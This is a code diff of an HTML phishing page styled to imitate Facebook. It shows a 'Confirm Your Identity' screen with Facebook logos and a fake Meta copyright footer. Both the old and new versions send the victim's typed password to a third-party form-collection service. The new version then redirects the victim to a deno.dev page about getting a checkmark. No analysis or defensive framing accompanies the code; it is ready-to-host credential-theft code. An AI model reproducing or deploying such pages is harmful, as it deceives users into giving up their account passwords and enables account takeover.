@@ -1,165 +1,214 @@
 
-
-
-
-
-
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Submit Form Integration</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: white;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
-            text-align: center;
-            width: 360px;
-            position: relative;
-        }
-        .logo {
-            margin-bottom: 20px;
-        }
-        .logo img {
-            width: 120px;
-        }
-        .header {
-            margin-bottom: 20px;
-            font-size: 18px;
-            color: #333;
-            font-weight: bold;
-        }
-        .form-group {
-            margin-bottom: 25px;
-            text-align: left;
-            position: relative;
-        }
-        .form-group label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #606770;
-        }
-        .input-wrapper {
-            position: relative;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 14px;
-            padding-right: 40px; /* Space for the eye icon */
-            border: 1px solid #ccd0d5;
-            border-radius: 6px;
-            font-size: 16px;
-            color: #1c1e21;
-            box-sizing: border-box;
-        }
-        .form-group input:focus {
-            border-color: #1877f2;
-            outline: none;
-            box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
-        }
-        .eye-icon {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 20px;
-            color: #606770;
-            cursor: pointer;
-            transition: color 0.3s ease;
-        }
-        .eye-icon:hover {
-            color: #1877f2;
-        }
-        .submit-button {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
-        }
-        .submit-button:hover {
-            background-color: #166fe5;
-        }
-        .error-message {
-            color: #e74c3c;
-            font-size: 14px;
-            margin-top: 5px;
-            margin-bottom: 15px;
-            text-align: left;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook | Confirm Password</title>
+  <link rel="icon" type="image/png" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    :root {
+      --bg-color: #f0f2f5;
+      --container-bg: #ffffff;
+      --primary-color: #1877f2;
+      --border-color: #ccd0d5;
+      --text-color: #1c1e21;
+      --accent-color: #e4e6eb;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: var(--bg-color);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
+
+    .top-bar {
+      background: var(--primary-color);
+      color: white;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      font-size: 20px;
+      font-weight: 600;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+
+    .top-bar .logo-text {
+      font-size: 22px;
+      font-weight: bold;
+    }
+
+    .top-bar a {
+      color: #dfe3ee;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .form-wrapper {
+      flex-grow: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background-color: var(--container-bg);
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      box-sizing: border-box;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 120px;
+    }
+
+    .header {
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    .description {
+      text-align: center;
+      font-size: 14px;
+      color: #606770;
+      margin-bottom: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #333;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 14px;
+      padding-right: 40px;
+      font-size: 15px;
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+      box-sizing: border-box;
+      color: var(--text-color);
+      background-color: var(--accent-color);
+    }
+
+    input[type="password"]:focus {
+      border-color: var(--primary-color);
+      outline: none;
+      background-color: #fff;
+      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
+    }
+
+    .eye-icon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      color: #606770;
+      cursor: pointer;
+    }
+
+    .submit-button {
+      width: 100%;
+      background-color: var(--primary-color);
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .submit-button:hover {
+      background-color: #166fe5;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+      padding: 16px;
+      background: #fff;
+      border-top: 1px solid #ddd;
+    }
+
+    .footer a {
+      color: #1877f2;
+      text-decoration: none;
+      margin: 0 6px;
+    }
+  </style>
 </head>
 <body>
+  <div class="top-bar">
+    <div class="logo-text">facebook</div>
+    <a href="#">Help</a>
+  </div>
+  <div class="form-wrapper">
     <div class="container">
-        <div class="logo">
-            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook Logo">
+      </div>
+      <div class="header">Confirm Your Identity</div>
+      <div class="description">Please re-enter your password to continue</div>
+      <form id="passwordForm" action="https://submit-form.com/3Yh1g3BKb" method="post">
+        <input type="hidden" name="_redirect" value="https://new-get-a-checkmark.deno.dev/final-page.html" />
+        <div class="form-group">
+          <label for="password">Password</label>
+          <div class="input-wrapper">
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            <i class="eye-icon fas fa-eye" id="togglePassword"></i>
+          </div>
         </div>
-        <div class="header">
-            Facebook Security
-        </div>
-        <p>Please re-enter your password to complete the request.</p>
-        <form class="sm:hidden lg:block md:block" action="https://submit-form.com/ZNoDrKXDq" method="post"> <input type="hidden" name="_redirect" value="https://www.facebook.com/help/media/thank-you?rdrhc" />
-            <div class="form-group">
-                <label for="password">Password</label>
-                <div class="input-wrapper">
-                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
-                    <i class="eye-icon fas fa-eye" id="togglePassword"></i>
-                </div>
-                <span id="error-message" class="error-message"></span>
-            </div>
-            <button type="submit" class="submit-button">Submit</button>
-        </form>
+        <button type="submit" class="submit-button">Submit</button>
+      </form>
     </div>
-    <script>
-        document.getElementById('togglePassword').addEventListener('click', function() {
-            var passwordField = document.getElementById('password');
-            var eyeIcon = this;
-            if (passwordField.type === 'password') {
-                passwordField.type = 'text';
-                eyeIcon.classList.remove('fa-eye');
-                eyeIcon.classList.add('fa-eye-slash');
-            } else {
-                passwordField.type = 'password';
-                eyeIcon.classList.remove('fa-eye-slash');
-                eyeIcon.classList.add('fa-eye');
-            }
-        });
+  </div>
+  <div class="footer">
+    &copy; 2025 Meta Platforms, Inc. · <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Cookies</a>
+  </div>
 
-        document.getElementById('passwordForm').addEventListener('submit', function(event) {
-            var passwordField = document.getElementById('password');
-            var errorMessage = document.getElementById('error-message');
-            if (passwordField.value.length < 6) {
-                errorMessage.textContent = 'Password must be at least 6 characters long.';
-                event.preventDefault();
-            } else {
-                errorMessage.textContent = '';
-                // Submit form normally
-                // Redirect after form submission
-                setTimeout(function() {
-                    window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
-                }, 2000); // Wait 2 seconds for form submission to complete
-            }
-        });
-    </script>
+  <script>
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordField = document.getElementById('password');
+
+    togglePassword.addEventListener('click', function () {
+      const type = passwordField.type === 'password' ? 'text' : 'password';
+      passwordField.type = type;
+      this.classList.toggle('fa-eye');
+      this.classList.toggle('fa-eye-slash');
+    });
+  </script>
 </body>
 </html>
